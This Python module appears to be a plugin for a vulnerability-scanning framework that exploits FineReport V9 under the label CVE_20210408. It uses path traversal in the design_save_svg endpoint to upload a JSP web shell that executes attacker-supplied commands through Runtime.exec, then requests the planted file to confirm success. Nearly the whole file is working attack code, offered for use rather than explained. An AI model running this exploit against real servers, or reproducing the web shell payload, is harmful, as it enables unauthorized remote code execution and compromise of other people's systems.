from ClassCongregation import _urlparse
from requests_toolbelt.utils import dump
from operator import methodcaller
#from ClassCongregation import Dnslog#通过Dnslog判断
#DL = Dnslog() #申请dnslog地址
#DL.dns_host() #返回dnslog地址
#DL.result()   #判断
import prettytable as pt
import requests,re
import CodeTest
################
##--FineReport--##
#CVE_20210408  [upload]，默认VULN = None
################
VULN = ''
TIMEOUT = ''

class FineReport():
    def __init__(self, url, CMD):
        self.url = url
        self.CMD = CMD
            
    def CVE_20210408_FineReport(self):
        self.pocname = 'FineReport:CVE_20210408'
        self.method = 'post'
        self.rawdata = 'null'
        self.info = '[upload]'
        self.r = "PoCWating"

        self.path = r'/WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/z06c28Pv.jsp'
        self.data = r'{"__CONTENT__":"<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>","__CHARSET__":"UTF-8"}'
        self.headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Content-Type': 'text/xml;charset=UTF-8', 'Accept-Au': '0c42b2f264071be0507acea1876c74'}
        try:
            if VULN == 'False':
                self.request = requests.post(self.url + self.path, data=self.data, headers=self.headers, timeout=TIMEOUT, verify=False)
                self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
                self.request_1 = requests.get(self.url + '/WebReport/z06c28Pv.jsp', headers=self.headers, timeout=TIMEOUT, verify=False)
                if self.request_1.status_code != 404:
                    self.r = 'PoCSuCCeSS'
                    CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
                else:
                    CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
            else:
                self.request = requests.post(self.url + self.path, data=self.data, headers=self.headers, timeout=TIMEOUT, verify=False)
                CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            CodeTest.verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            CodeTest.verify.connection_output(self.pocname)
        except Exception as error:
            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)

tb = pt.PrettyTable()
tb.field_names = ['Target type', 'Vuln Name', 'Poc', 'Exp', 'Impact Version && Vulnerability description']
tb.align['Target type'] = 'l'
tb.align['Vuln Name'] = 'l'
tb.align['Impact Version && Vulnerability description'] = 'l'
print_result = ("FineReport", "CVE_20210408" ,"N" ,"Y" ,"帆软V9, [upload]")
tb.add_row(print_result)
print(tb)

def check(**kwargs):
    global VULN,TIMEOUT
    VULN = kwargs['vuln']
    TIMEOUT = int(kwargs['timeout'])
    CodeTest.Verification.CMD = kwargs['cmd']
    CodeTest.Verification.VULN = kwargs['vuln']
    if VULN == 'False':
        ExpFineReport = FineReport(_urlparse(kwargs['url']),'echo VuLnEcHoPoCSuCCeSS')
    else:
        ExpFineReport = FineReport(_urlparse(kwargs['url']),kwargs['cmd'])
    if kwargs['pocname'] != 'ALL':
        func = getattr(ExpFineReport, kwargs['pocname'])#返回对象函数属性值，可以直接调用
        func()#调用函数
    else:#调用所有函数
        for func in dir(FineReport):
            if not func.startswith("__"):
                methodcaller(func)(ExpFineReport)
